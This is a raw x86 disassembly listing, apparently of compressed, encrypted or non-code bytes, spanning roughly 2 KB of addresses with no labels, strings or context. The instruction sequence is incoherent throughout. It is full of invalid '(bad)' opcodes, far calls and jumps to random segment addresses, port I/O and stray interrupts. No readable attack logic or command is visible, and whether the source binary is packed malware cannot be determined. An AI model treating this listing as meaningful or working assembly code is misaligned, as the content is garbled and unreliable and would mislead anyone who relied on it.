  41fdc1:	pop    ds
  41fdc2:	inc    edx
  41fdc3:	in     al,0x7
  41fdc5:	push   ebp
  41fdc6:	cmp    al,BYTE PTR fs:[edi+0x13]
  41fdca:	pop    esi
  41fdcb:	ret    0xd73e
  41fdce:	inc    ebx
  41fdcf:	loop   0x41fe2e
  41fdd1:	leave  
  41fdd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdd3:	xchg   ebp,eax
  41fdd4:	scas   eax,DWORD PTR es:[edi]
  41fdd5:	jne    0x41fdee
  41fdd7:	adc    BYTE PTR [esi-0x6da50455],dl
  41fddd:	or     DWORD PTR [edx+0x70ba2c34],esp
  41fde3:	sahf   
  41fde4:	or     dh,BYTE PTR ds:0x3114217a
  41fdea:	inc    ebp
  41fdeb:	in     al,0x74
  41fded:	fcomip st,st(5)
  41fdef:	clc    
  41fdf0:	adc    BYTE PTR [edx+0x52],dl
  41fdf3:	ret    
  41fdf4:	push   ss
  41fdf5:	jns    0x41fda1
  41fdf7:	aaa    
  41fdf8:	or     eax,0xf61d61a8
  41fdfd:	(bad)  
  41fdfe:	std    
  41fdff:	xchg   BYTE PTR [ebp-0x62],dh
  41fe02:	ins    DWORD PTR es:[edi],dx
  41fe03:	out    dx,al
  41fe04:	ficomp DWORD PTR [esi]
  41fe06:	inc    eax
  41fe07:	repz jae 0x41fdef
  41fe0a:	daa    
  41fe0b:	call   0x38c0:0x3b6c5bc7
  41fe12:	jae    0x41fda4
  41fe14:	xor    al,0x8e
  41fe16:	je     0x41fe61
  41fe18:	xchg   esi,eax
  41fe19:	mov    BYTE PTR [ecx+0x3b256871],bh
  41fe1f:	ss popf 
  41fe21:	popf   
  41fe22:	cmp    DWORD PTR [edi+0x605379b5],edx
  41fe28:	mov    dl,0xc8
  41fe2a:	retf   
  41fe2b:	out    0x49,al
  41fe2d:	les    ebp,FWORD PTR [ebx]
  41fe2f:	xchg   ebx,eax
  41fe30:	push   0x74
  41fe32:	or     bl,BYTE PTR [ebx]
  41fe34:	sbb    dl,bl
  41fe36:	pop    esp
  41fe37:	and    BYTE PTR [eax+0x45],bl
  41fe3a:	xor    BYTE PTR [ecx+0x251d302f],bl
  41fe40:	push   ss
  41fe41:	sbb    ecx,DWORD PTR [edi+0x7d]
  41fe44:	addr16 xor dh,dh
  41fe47:	rol    DWORD PTR [ebp-0x135ec90],0xa2
  41fe4e:	xor    edx,DWORD PTR [edi]
  41fe50:	cmp    edi,ebp
  41fe52:	dec    edx
  41fe53:	jnp    0x41fdf9
  41fe55:	popa   
  41fe56:	clc    
  41fe57:	inc    edx
  41fe58:	cmp    al,0xd8
  41fe5a:	dec    eax
  41fe5b:	stos   BYTE PTR es:[edi],al
  41fe5c:	call   0x5ef1:0xf58d8689
  41fe63:	lods   eax,DWORD PTR ds:[esi]
  41fe64:	inc    ecx
  41fe65:	jmp    0x46f3a312
  41fe6a:	xchg   esp,eax
  41fe6b:	ins    DWORD PTR es:[edi],dx
  41fe6c:	jnp    0x41feb4
  41fe6e:	addr16 icebp 
  41fe70:	fnstenv cs:0x4c38acf4
  41fe77:	mov    cl,BYTE PTR [ebx-0x3ab7e89d]
  41fe7d:	les    edi,FWORD PTR [ebx]
  41fe7f:	dec    esp
  41fe80:	inc    ecx
  41fe81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe82:	je     0x41fed4
  41fe84:	inc    esp
  41fe85:	mov    ch,0xe7
  41fe87:	inc    BYTE PTR [esi+0x392c5287]
  41fe8d:	jnp    0x41fe7f
  41fe8f:	fdiv   QWORD PTR [edi-0x6b]
  41fe92:	mov    bh,0xac
  41fe94:	jnp    0x41fedb
  41fe96:	repz bnd jns 0x41fe2d
  41fe9a:	inc    edx
  41fe9b:	dec    eax
  41fe9c:	icebp  
  41fe9d:	pop    ds
  41fe9e:	inc    ecx
  41fe9f:	dec    esi
  41fea0:	inc    esp
  41fea1:	jl     0x41fe50
  41fea3:	fst    st(4)
  41fea5:	in     eax,dx
  41fea6:	pop    edx
  41fea7:	mov    bl,bh
  41fea9:	test   al,0xf6
  41feab:	and    al,0x79
  41fead:	push   0xc538faa3
  41feb2:	loop   0x41fed1
  41feb4:	test   BYTE PTR [ebx+eiz*2+0xf],bl
  41feb8:	enter  0x72b8,0x5
  41febc:	pop    esi
  41febd:	sub    DWORD PTR ds:0xc5026965,0x0
  41fec4:	les    ebp,FWORD PTR [esp+ecx*4-0x28f789db]
  41fecb:	(bad)  
  41fecc:	bound  ebp,QWORD PTR [ebx+0x3d074d66]
  41fed2:	jns    0x41feda
  41fed4:	add    DWORD PTR [edx],edi
  41fed6:	xchg   BYTE PTR [esi],al
  41fed8:	pop    edi
  41fed9:	add    ch,BYTE PTR [edi+0x60]
  41fedc:	popf   
  41fedd:	pop    edx
  41fede:	cmp    al,0xee
  41fee0:	cs push eax
  41fee2:	icebp  
  41fee3:	jge    0x41ff06
  41fee5:	in     al,dx
  41fee6:	push   ds
  41fee7:	jns    0x41ff2c
  41fee9:	adc    al,0xac
  41feeb:	ja     0x41fefa
  41feed:	int    0x9c
  41feef:	imul   esp,DWORD PTR [edx],0xffffffc9
  41fef2:	stos   BYTE PTR es:[edi],al
  41fef3:	xchg   esp,eax
  41fef4:	pop    esi
  41fef5:	cmp    dh,BYTE PTR [esi]
  41fef7:	sbb    DWORD PTR [ebx-0x57d276d0],esi
  41fefd:	add    DWORD PTR [eax],edx
  41feff:	pop    edx
  41ff00:	dec    ebx
  41ff01:	sbb    al,0x9e
  41ff03:	inc    edi
  41ff04:	xchg   esi,eax
  41ff05:	jg     0x41ff79
  41ff07:	ror    ch,1
  41ff09:	adc    DWORD PTR [ebp-0x71],ebp
  41ff0c:	cmp    bl,BYTE PTR [edx]
  41ff0e:	ret    
  41ff0f:	fnstcw WORD PTR [edx-0x7a]
  41ff12:	adc    BYTE PTR [ecx+ebx*4+0x78],ch
  41ff16:	pop    esi
  41ff17:	je     0x41ff61
  41ff19:	xor    BYTE PTR [esi],bl
  41ff1b:	test   eax,0xda1c6ff
  41ff20:	mov    ecx,0x9633185b
  41ff25:	aam    0x9c
  41ff27:	sub    ch,BYTE PTR [esi]
  41ff29:	ins    DWORD PTR es:[edi],dx
  41ff2a:	addr16 pop eax
  41ff2c:	repz mov eax,ds:0x94d6f539
  41ff32:	imul   edi,DWORD PTR [edi+0x4f36f2f8],0x60
  41ff39:	push   es
  41ff3a:	ins    BYTE PTR es:[edi],dx
  41ff3b:	xchg   edi,eax
  41ff3c:	test   esp,eax
  41ff3e:	add    ebp,ebx
  41ff40:	retf   0x80f1
  41ff43:	out    dx,eax
  41ff44:	cld    
  41ff45:	test   eax,0x337f7e57
  41ff4a:	mov    ecx,0x9e2be57f
  41ff4f:	inc    esi
  41ff50:	xor    DWORD PTR [ebp-0x78],ecx
  41ff53:	(bad)  
  41ff54:	scas   al,BYTE PTR es:[edi]
  41ff55:	adc    eax,0x4bcd36d3
  41ff5a:	shl    BYTE PTR [ebx-0x6af5eeb0],1
  41ff60:	mov    ss,WORD PTR [eax+0x1b]
  41ff63:	pop    ss
  41ff64:	pop    ebx
  41ff65:	xor    ecx,DWORD PTR [ebx-0x216611f2]
  41ff6b:	add    eax,0x6bed0c83
  41ff70:	fiadd  WORD PTR ds:0x89ab165b
  41ff76:	sti    
  41ff77:	mov    eax,ds:0xecd05fae
  41ff7c:	es cs es inc esp
  41ff80:	out    dx,al
  41ff81:	or     bh,BYTE PTR [esi]
  41ff83:	fst    QWORD PTR ds:0x3e2dd8d0
  41ff89:	imul   eax,DWORD PTR [esi],0x38
  41ff8c:	push   0x7cb1f22f
  41ff91:	dec    ebx
  41ff92:	mov    ecx,0x1a9ca9b0
  41ff97:	jns    0x41ff46
  41ff99:	fisttp DWORD PTR [ebx+0x7eb0975f]
  41ff9f:	ffreep st(5)
  41ffa1:	dec    eax
  41ffa2:	xchg   BYTE PTR [eax+ebp*1],bl
  41ffa5:	pop    edi
  41ffa6:	loopne 0x41fffc
  41ffa8:	nop
  41ffa9:	push   es
  41ffaa:	nop
  41ffab:	mov    eax,ds:0x95ae0426
  41ffb0:	cdq    
  41ffb1:	inc    edx
  41ffb2:	add    al,0xdd
  41ffb4:	call   0xe13b:0x5539b906
  41ffbb:	xchg   edi,eax
  41ffbc:	sub    al,0xe0
  41ffbe:	push   edx
  41ffbf:	dec    esi
  41ffc0:	aas    
  41ffc1:	gs cli 
  41ffc3:	push   ebx
  41ffc4:	sbb    dl,dl
  41ffc6:	fidivr DWORD PTR [eax]
  41ffc8:	push   eax
  41ffc9:	xchg   esp,eax
  41ffca:	push   cs
  41ffcb:	sub    bl,0x4
  41ffce:	test   DWORD PTR [ecx+eax*1-0x258d6c38],ebx
  41ffd5:	js     0x41ff8e
  41ffd7:	es je  0x41ffae
  41ffda:	mov    BYTE PTR [esi+0x1c],al
  41ffdd:	std    
  41ffde:	xchg   edi,eax
  41ffdf:	xor    dl,BYTE PTR [ecx-0x55c26aaf]
  41ffe5:	or     ecx,DWORD PTR cs:[ebx]
  41ffe8:	aam    0xca
  41ffea:	or     dh,BYTE PTR ds:0xcc22ff55
  41fff0:	sbb    ebx,esi
  41fff2:	sti    
  41fff3:	jl     0x420021
  41fff5:	imul   ebp,DWORD PTR [esi],0x1e95744
  41fffb:	xchg   esp,eax
  41fffc:	into   
  41fffd:	fwait
  41fffe:	mov    ds:0x7e8c5e1e,al
  420003:	jb     0x41ffe7
  420005:	push   ss
  420006:	lds    eax,FWORD PTR [ebx]
  420008:	fwait
  420009:	outs   dx,BYTE PTR ds:[esi]
  42000a:	out    0xa7,eax
  42000c:	mov    eax,0xc0010393
  420011:	retf   
  420012:	leave  
  420013:	mov    cl,0x2d
  420015:	add    al,0xa7
  420017:	sbb    eax,DWORD PTR [edi]
  420019:	xor    eax,0x247959b7
  42001e:	out    0x83,eax
  420020:	push   edi
  420021:	xchg   edi,eax
  420022:	mov    cl,0x5d
  420024:	outs   dx,BYTE PTR ds:[esi]
  420025:	dec    eax
  420026:	jmp    0x42009a
  420028:	call   DWORD PTR [edi]
  42002a:	cmp    eax,0x23fc07b3
  42002f:	aas    
  420030:	(bad)  
  420031:	push   0xc16cc83b
  420036:	dec    edi
  420037:	pop    edi
  420038:	mov    BYTE PTR [ebx],cl
  42003a:	and    bh,BYTE PTR [eax]
  42003c:	sbb    dl,dl
  42003e:	aad    0x33
  420040:	xchg   edx,eax
  420041:	into   
  420042:	das    
  420043:	pusha  
  420044:	dec    esi
  420045:	pop    ebp
  420046:	outs   dx,DWORD PTR ds:[esi]
  420047:	test   ah,bh
  420049:	(bad)  [ecx]
  42004b:	sub    al,0x14
  42004d:	call   0x9693:0x9e7a767
  420054:	dec    esp
  420055:	dec    esp
  420056:	add    al,0x6f
  420058:	cld    
  420059:	mov    al,0x88
  42005b:	data16 sahf 
  42005d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42005e:	pop    ecx
  42005f:	mov    es,WORD PTR [ebp+0x51]
  420062:	mov    edi,DWORD PTR [ecx]
  420064:	cdq    
  420065:	mov    DWORD PTR [esi+0x6e5efdb1],esp
  42006b:	mov    edi,0xbc9ae36a
  420070:	imul   ebx,esi,0xbe934ba
  420076:	int3   
  420077:	aad    0x5a
  420079:	sbb    BYTE PTR [ecx],ah
  42007b:	and    edx,DWORD PTR [eax+0x34]
  42007e:	inc    DWORD PTR [ecx-0x55]
  420081:	ja     0x4200e2
  420083:	jecxz  0x420096
  420085:	test   al,0x32
  420087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420088:	fcmovnb st,st(4)
  42008a:	push   esp
  42008b:	lea    esp,[esi]
  42008d:	les    eax,FWORD PTR [ebx+0x6c]
  420090:	push   cs
  420091:	stos   DWORD PTR es:[edi],eax
  420092:	add    ah,BYTE PTR [ebx+0x695d882c]
  420098:	psrad  mm7,QWORD PTR ds:0xb93a3fe8
  42009f:	(bad)  
  4200a0:	fnsave [edi-0x72941d82]
  4200a6:	leave  
  4200a7:	push   ds
  4200a8:	cs mov ah,0xbd
  4200ab:	mov    edi,0x76a0c57b
  4200b0:	mov    fs,edi
  4200b2:	cwde   
  4200b3:	mov    cl,0x96
  4200b5:	dec    edx
  4200b6:	dec    edx
  4200b7:	mov    eax,0x18edd7eb
  4200bc:	xor    eax,0x9bb6142c
  4200c1:	repnz pop edx
  4200c3:	shr    DWORD PTR [ecx+ebx*2],0x41
  4200c7:	inc    al
  4200c9:	cmp    BYTE PTR [edi+0x1faa77ce],ah
  4200cf:	xor    al,0x6c
  4200d1:	dec    ebp
  4200d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d3:	js     0x42012d
  4200d5:	test   eax,0x25a3e98a
  4200da:	push   eax
  4200db:	pop    ebx
  4200dc:	bound  edi,QWORD PTR [edi-0x3c]
  4200df:	jmp    0x420099
  4200e1:	cmp    al,0x41
  4200e3:	mov    ecx,0xc7320b65
  4200e8:	xchg   esi,eax
  4200e9:	loopne 0x4200c6
  4200eb:	pop    ds
  4200ec:	mov    al,ds:0xa54ab15f
  4200f1:	mov    bh,0xb9
  4200f3:	cmp    al,0x66
  4200f5:	adc    al,ah
  4200f7:	std    
  4200f8:	xlat   BYTE PTR ds:[ebx]
  4200f9:	xchg   DWORD PTR [edx+0x2cd0d092],ecx
  4200ff:	loopne 0x420115
  420101:	xchg   DWORD PTR [edi],esp
  420103:	lods   al,BYTE PTR ds:[esi]
  420104:	stos   BYTE PTR es:[edi],al
  420105:	mov    dh,0xcb
  420107:	popf   
  420108:	hlt    
  420109:	xchg   edx,eax
  42010a:	dec    ebp
  42010b:	xlat   BYTE PTR ds:[ebx]
  42010c:	push   ebx
  42010d:	out    dx,eax
  42010e:	lods   al,BYTE PTR ds:[esi]
  42010f:	addr16 jo 0x4200a8
  420112:	mov    esi,0x931ab947
  420117:	es scas al,BYTE PTR es:[edi]
  420119:	mov    eax,0xb662b11d
  42011e:	pop    es
  42011f:	cmovbe ebp,DWORD PTR [esi+0x62388cbd]
  420126:	repz inc esp
  420128:	ret    0x5707
  42012b:	xor    DWORD PTR [ecx+0x5042305f],ecx
  420131:	add    edx,DWORD PTR [esi+ebp*4-0xaba55a8]
  420138:	and    bl,BYTE PTR [esi+eax*4]
  42013b:	adc    al,0x11
  42013d:	sub    al,0x1e
  42013f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420140:	icebp  
  420141:	push   ebp
  420142:	aaa    
  420143:	mov    edx,DWORD PTR [ebx+0x4c]
  420146:	ins    DWORD PTR es:[edi],dx
  420147:	jge    0x420171
  420149:	sub    esi,DWORD PTR [ebx+esi*4+0x3a1d5d40]
  420150:	lahf   
  420151:	stc    
  420152:	jge    0x420162
  420154:	sub    al,0xfb
  420156:	icebp  
  420157:	daa    
  420158:	outs   dx,BYTE PTR ds:[esi]
  420159:	inc    edx
  42015a:	aas    
  42015b:	xchg   esp,eax
  42015c:	es xor eax,0xa76d0a47
  420162:	xchg   BYTE PTR [eax+0xcea63af],ah
  420168:	repnz mov eax,0x995c1e9
  42016e:	les    edi,FWORD PTR [eax+0xf]
  420171:	out    0x27,al
  420173:	mov    DWORD PTR [esi+eiz*4+0x6c],esp
  420177:	xchg   BYTE PTR [edi],dl
  420179:	imul   ebp,DWORD PTR [edx],0xffffff86
  42017c:	daa    
  42017d:	adc    ah,BYTE PTR [ebx]
  42017f:	cmc    
  420180:	push   ss
  420181:	add    ebp,DWORD PTR [eax+0x5f]
  420184:	add    DWORD PTR [edi+0x4e],esi
  420187:	lahf   
  420188:	inc    eax
  420189:	addr16 mov eax,ds:0xceb1
  42018d:	jnp    0x420115
  42018f:	aas    
  420190:	adc    DWORD PTR [edx],edi
  420192:	faddp  st(2),st
  420194:	cmp    eax,0x15358a2d
  420199:	cld    
  42019a:	or     eax,0x594586e4
  42019f:	std    
  4201a0:	fadd   DWORD PTR [edi-0x3dec769d]
  4201a6:	push   ecx
  4201a7:	push   ebp
  4201a8:	and    al,BYTE PTR [esi]
  4201aa:	mov    ds:0x59c0d54e,al
  4201af:	cmp    dh,al
  4201b1:	mov    eax,ds:0x14804117
  4201b6:	outs   dx,DWORD PTR ds:[esi]
  4201b7:	push   0x0
  4201b9:	pop    ecx
  4201ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201bb:	inc    esp
  4201bc:	lock aam 0xbb
  4201bf:	pop    ebx
  4201c0:	hlt    
  4201c1:	or     BYTE PTR [eax],dl
  4201c3:	lods   al,BYTE PTR ds:[esi]
  4201c4:	rcl    DWORD PTR [eax+eiz*8],cl
  4201c7:	in     al,0xdd
  4201c9:	pop    esp
  4201ca:	addr16 ret 0x6752
  4201ce:	popf   
  4201cf:	pop    esp
  4201d0:	cld    
  4201d1:	mov    al,0xea
  4201d3:	mov    BYTE PTR [ebp-0x4c2104b6],ch
  4201d9:	retf   
  4201da:	ds pop ss
  4201dc:	and    dl,ch
  4201de:	(bad)  
  4201df:	and    cl,BYTE PTR [esi]
  4201e1:	test   al,0x33
  4201e3:	mov    bl,0x40
  4201e5:	pusha  
  4201e6:	fisttp WORD PTR [ebx]
  4201e8:	mov    cl,BYTE PTR [esp+ecx*2]
  4201eb:	inc    ebp
  4201ec:	push   edi
  4201ed:	pop    ecx
  4201ee:	push   ds
  4201ef:	retf   
  4201f0:	int    0x2b
  4201f2:	jnp    0x420230
  4201f4:	add    DWORD PTR [ebx+0x38],0x5f02d9e0
  4201fb:	shl    DWORD PTR [ecx-0x17d9d0de],1
  420201:	inc    eax
  420202:	shl    BYTE PTR [ecx*8+0x5d77930b],cl
  420209:	mov    ecx,0xc1b4ab3d
  42020e:	mov    ebp,0xb9b1420
  420213:	push   esi
  420214:	adc    edi,0x53
  420217:	aam    0xf9
  420219:	mov    cl,0x1d
  42021b:	nop    ecx
  42021e:	dec    eax
  42021f:	int3   
  420220:	in     eax,0x92
  420222:	mov    edi,0xcc9a884
  420227:	pusha  
  420228:	push   0x46
  42022a:	jle    0x42022e
  42022c:	jns    0x420253
  42022e:	mov    ah,0xdd
  420230:	cdq    
  420231:	shl    DWORD PTR [edi+ebp*2-0x66],0xe7
  420236:	pop    es
  420237:	or     al,0x31
  420239:	cmc    
  42023a:	ins    BYTE PTR es:[edi],dx
  42023b:	jmp    0x420255
  42023d:	mov    ebp,0xaef40f72
  420242:	scas   eax,DWORD PTR es:[edi]
  420243:	xchg   ebx,eax
  420244:	pop    esp
  420245:	and    eax,0x94f2a925
  42024a:	imul   ecx,DWORD PTR [ebx+0x3e],0x95e04d86
  420251:	sbb    edx,ebx
  420253:	in     al,dx
  420254:	inc    edx
  420255:	jg     0x42026a
  420257:	and    BYTE PTR ds:0xd416c8db,0xfa
  42025e:	mov    eax,0xb7ae4746
  420263:	into   
  420264:	cmp    eax,0xfc3f7704
  420269:	cmp    dl,BYTE PTR [esi]
  42026b:	xchg   esp,eax
  42026c:	(bad)  
  42026d:	fisubr DWORD PTR [esp+ebx*8+0x330c18fa]
  420274:	and    eax,0x48bdeb50
  420279:	add    edx,DWORD PTR [edx-0x28244cb8]
  42027f:	stos   BYTE PTR es:[edi],al
  420280:	lds    edi,FWORD PTR [ecx-0x3a528c6d]
  420286:	pop    eax
  420287:	call   0xb6e0:0x9cafc555
  42028e:	cdq    
  42028f:	fiadd  WORD PTR [edx]
  420291:	dec    ecx
  420292:	mov    ah,BYTE PTR [edx-0x30]
  420295:	mov    BYTE PTR [ebx+0x467371e5],ch
  42029b:	adc    cl,BYTE PTR [eax+0x7b]
  42029e:	jecxz  0x420276
  4202a0:	data16 fiadd WORD PTR [ebx+0x58]
  4202a4:	int3   
  4202a5:	ds jp  0x4202cc
  4202a8:	inc    edi
  4202a9:	rcr    BYTE PTR [esi-0x1f],0xbb
  4202ad:	and    DWORD PTR [esi-0x2a1be669],esi
  4202b3:	pop    esp
  4202b4:	mov    al,ds:0x2e3bb93b
  4202b9:	mov    al,0x7e
  4202bb:	mov    bh,0x3b
  4202bd:	mov    esp,0xcf29a6a9
  4202c2:	or     DWORD PTR [edi+eiz*4],eax
  4202c5:	in     al,0x34
  4202c7:	daa    
  4202c8:	test   ebp,ebp
  4202ca:	pop    ecx
  4202cb:	sub    BYTE PTR [ecx-0x15b627eb],0x56
  4202d2:	xor    cl,BYTE PTR [edx-0x5db3ff23]
  4202d8:	icebp  
  4202d9:	mov    ds:0xb4db7cbb,eax
  4202de:	cmp    eax,0x49813e02
  4202e3:	imul   edx,DWORD PTR [ecx+0x7812c767],0x1a459558
  4202ed:	xchg   edx,eax
  4202ee:	pop    esp
  4202ef:	cmp    BYTE PTR [ebx+eiz*8],ah
  4202f2:	mov    eax,ds:0x414f9957
  4202f7:	(bad)  
  4202f8:	mov    ecx,0x42b4c7dc
  4202fd:	fwait
  4202fe:	pop    ebx
  4202ff:	cmp    dl,BYTE PTR [edi-0x6666d43b]
  420305:	sahf   
  420306:	mov    ebx,0x68ac6526
  42030b:	mov    edx,0x6d797d0
  420310:	js     0x4202ea
  420312:	mov    eax,0xb896d048
  420317:	lea    ebp,[esi]
  420319:	ins    DWORD PTR es:[edi],dx
  42031a:	xchg   edx,eax
  42031b:	dec    edi
  42031c:	icebp  
  42031d:	adc    eax,0x62f46ecf
  420322:	stos   DWORD PTR es:[edi],eax
  420323:	sti    
  420324:	stc    
  420325:	mov    ebp,0x34e60797
  42032a:	mov    esi,0x7b16e938
  42032f:	push   esi
  420330:	loop   0x420318
  420332:	mov    ds:0x77c05984,eax
  420337:	mov    es,WORD PTR [edi+0x31d0d269]
  42033d:	lahf   
  42033e:	mov    esp,0xf2b77ea5
  420343:	sbb    ebp,ebp
  420345:	xchg   ebp,eax
  420346:	std    
  420347:	add    eax,0x3604361c
  42034c:	jle    0x4202dd
  42034e:	imul   cl
  420350:	neg    BYTE PTR [eax+esi*1-0x16]
  420354:	into   
  420355:	fcomp  QWORD PTR [ebp+0x25180a51]
  42035b:	and    DWORD PTR [ebx+0x4],edx
  42035e:	or     esp,DWORD PTR [esi]
  420360:	pop    edi
  420361:	sbb    eax,DWORD PTR [edx+ebx*1]
  420364:	xchg   esp,eax
  420365:	xchg   esi,eax
  420366:	fimul  WORD PTR [eax+0x20d459b2]
  42036c:	dec    BYTE PTR [edx+0x42945d2f]
  420372:	mov    ds:0x81ed7750,al
  420377:	icebp  
  420378:	repz icebp 
  42037a:	mov    ah,0x84
  42037c:	pop    edx
  42037d:	sub    bl,dl
  42037f:	lods   eax,DWORD PTR ds:[esi]
  420380:	jo     0x420313
  420382:	mov    edx,0xe10f3a5d
  420387:	loope  0x4203c7
  420389:	ins    BYTE PTR es:[edi],dx
  42038a:	ss push ss
  42038c:	adc    eax,ecx
  42038e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42038f:	in     eax,dx
  420390:	inc    eax
  420391:	xor    BYTE PTR [ebx+0x2f018bf4],ah
  420397:	mov    eax,ds:0x820b7686
  42039c:	out    dx,eax
  42039d:	push   ecx
  42039e:	lods   eax,DWORD PTR ds:[esi]
  42039f:	sub    al,0xcc
  4203a1:	xchg   esi,eax
  4203a2:	adc    BYTE PTR [edx-0x5b078429],bh
  4203a8:	test   BYTE PTR [edi+0x63b837ec],ah
  4203ae:	pop    esi
  4203af:	hlt    
  4203b0:	pop    esi
  4203b1:	or     ch,BYTE PTR [ebx+0x75]
  4203b4:	test   bl,bh
  4203b6:	pop    esp
  4203b7:	test   BYTE PTR [edx+0x50],bl
  4203ba:	mov    eax,ds:0xea6fd8a9
  4203bf:	les    ebp,FWORD PTR [edx]
  4203c1:	lock adc DWORD PTR [ecx+0x5c],edx
  4203c5:	(bad)  
  4203c6:	or     bl,BYTE PTR [esi+0x3d814e53]
  4203cc:	mov    bh,0x23
  4203ce:	dec    edi
  4203cf:	rcl    DWORD PTR [ebx],0x18
  4203d2:	push   0xfffffff5
  4203d4:	cmc    
  4203d5:	mov    ch,0x7d
  4203d7:	lods   eax,DWORD PTR ds:[esi]
  4203d8:	dec    ecx
  4203d9:	rcr    BYTE PTR [edx],0xf7
  4203dc:	aam    0x92
  4203de:	xchg   ebx,eax
  4203df:	fistp  WORD PTR [esi-0x16]
  4203e2:	push   0x70
  4203e4:	push   ecx
  4203e5:	push   ebx
  4203e6:	loope  0x420375
  4203e8:	cli    
  4203e9:	jnp    0x420379
  4203eb:	mov    eax,cs
  4203ed:	add    eax,0x1d13c41
  4203f2:	iret   
  4203f3:	scas   eax,DWORD PTR es:[edi]
  4203f4:	add    esp,ebx
  4203f6:	lods   eax,DWORD PTR ds:[esi]
  4203f7:	push   ebx
  4203f8:	iret   
  4203f9:	ds ins DWORD PTR es:[edi],dx
  4203fb:	mov    edx,0x3922249a
  420400:	dec    esp
  420401:	sub    ah,0x12
  420404:	or     dh,BYTE PTR [esi]
  420406:	and    DWORD PTR ds:0x9e4e11c4,ecx
  42040c:	adc    DWORD PTR [ecx-0x6f],esp
  42040f:	xor    BYTE PTR [esi+0x5873f44e],al
  420415:	jo     0x4203ba
  420417:	adc    BYTE PTR [edx+0x7a851c14],0x14
  42041e:	xor    DWORD PTR [ecx+0x22],0xe16a0c87
  420425:	add    edi,DWORD PTR [edi-0xe]
  420428:	stos   BYTE PTR es:[edi],al
  420429:	ror    ebp,cl
  42042b:	pop    esi
  42042c:	mov    cl,0x4
  42042e:	pusha  
  42042f:	(bad)  
  420430:	out    0x86,al
  420432:	and    eax,0x603251a3
  420437:	xchg   ebx,eax
  420438:	test   eax,0x1821faea
  42043d:	jno    0x4204b0
  42043f:	xchg   esp,eax
  420440:	mov    al,ds:0x83fc0a37
  420445:	add    bl,BYTE PTR [esi]
  420447:	jecxz  0x42041d
  420449:	mov    al,0xdc
  42044b:	pop    ecx
  42044c:	nop
  42044d:	int    0x42
  42044f:	ja     0x4203f5
  420451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420452:	loop   0x420458
  420454:	inc    ecx
  420455:	lods   al,BYTE PTR ds:[esi]
  420456:	xchg   esi,eax
  420457:	clc    
  420458:	sub    DWORD PTR [edx-0x47],eax
  42045b:	xchg   edi,eax
  42045c:	pop    edx
  42045d:	push   0x66d532a0
  420462:	dec    ebx
  420463:	cmc    
  420464:	int    0x28
  420466:	push   0x26
  420468:	inc    ebx
  420469:	push   cs
  42046a:	sti    
  42046b:	pop    esp
  42046c:	je     0x420440
  42046e:	xchg   esi,eax
  42046f:	jb     0x420498
  420471:	sbb    bh,BYTE PTR [edx+0x5ddb01ae]
  420477:	sub    DWORD PTR [ecx],ecx
  420479:	test   al,0x9
  42047b:	mov    ebp,DWORD PTR [ebp+0x12bc862e]
  420481:	fbstp  TBYTE PTR [eax-0x72]
  420484:	mov    edx,0x5fe69ddd
  420489:	inc    eax
  42048a:	jmp    0x702d576b
  42048f:	sub    ch,BYTE PTR ds:0x37082fe
  420495:	and    dl,BYTE PTR [ebx+0x54865593]
  42049b:	addr16 sahf 
  42049d:	fisub  DWORD PTR [eax-0x1b]
  4204a0:	and    al,0x1c
  4204a2:	pop    edi
  4204a3:	and    BYTE PTR [esi-0x4b],bl
  4204a6:	add    bh,BYTE PTR gs:[edi-0x18e81b02]
  4204ad:	mov    al,BYTE PTR [ebp+0x4c]
  4204b0:	jnp    0x420525
  4204b2:	ror    dh,cl
  4204b4:	sti    
  4204b5:	inc    esi
  4204b6:	les    ecx,FWORD PTR [ebx+eiz*8+0x1aa25ef8]
  4204bd:	jo     0x42050a
  4204bf:	pop    es
  4204c0:	test   BYTE PTR [ecx],dl
  4204c2:	pop    es
  4204c3:	cmp    ah,BYTE PTR [edx]
  4204c5:	lods   eax,DWORD PTR ds:[esi]
  4204c6:	mov    ds:0x96398c8f,eax
  4204cb:	fstp   TBYTE PTR [esi-0x5d]
  4204ce:	out    dx,eax
  4204cf:	shl    esp,cl
  4204d1:	test   BYTE PTR [edx+0x4a],dl
  4204d4:	mov    eax,ds:0x29fbba63
  4204d9:	int    0x83
  4204db:	xor    eax,0xf0421d8a
  4204e0:	or     ecx,eax
  4204e2:	adc    eax,0x6ae1f932
  4204e7:	add    ch,al
  4204e9:	test   eax,0xcb6e4a4b
  4204ee:	popa   
  4204ef:	push   es
  4204f0:	rcl    bh,0x2b
  4204f3:	mov    bh,BYTE PTR [ebx-0x31e0a528]
  4204f9:	int    0x5f
  4204fb:	push   ebx
  4204fc:	pop    es
  4204fd:	and    al,0x9c
  4204ff:	jmp    0x126d:0xafc5b2d2
  420506:	loop   0x420499
  420508:	hlt    
  420509:	mov    dh,0x20
  42050b:	int3   
  42050c:	call   0xb9f43034
  420511:	sbb    BYTE PTR [esi],ah
  420513:	int3   
  420514:	std    
  420515:	mov    cl,0x59
  420517:	ror    cl,cl
  420519:	dec    esi
  42051a:	dec    edx
  42051b:	mov    al,0xc7
  42051d:	(bad)  
  42051e:	xchg   ecx,eax
  42051f:	repnz pop es
  420521:	or     BYTE PTR [eax+0x7c],0x9b
  420525:	push   edx
  420526:	mov    ebp,0x4462893
  42052b:	mov    esp,0x4181f7d7
  420530:	adc    BYTE PTR [edi+0x28],cl
  420533:	adc    DWORD PTR [ebp+eiz*4-0x42],edx
  420537:	outs   dx,DWORD PTR ds:[esi]
  420538:	shl    DWORD PTR [ecx-0x1b],cl
  42053b:	lea    ebp,[ecx]
  42053d:	arpl   WORD PTR [ebx-0x729695be],bp
  420543:	mov    DWORD PTR [ecx-0x6],ecx
  420546:	xchg   edx,eax
  420547:	cmp    DWORD PTR [ecx],0x75
  42054a:	mov    ebp,DWORD PTR [esi]
  42054c:	mov    ebx,0xcfaa725e
  420551:	nop    DWORD PTR [ebp+esi*2-0x1eb644b7]
  420559:	adc    BYTE PTR [ebx],cl
  42055b:	ret    0xf6ed
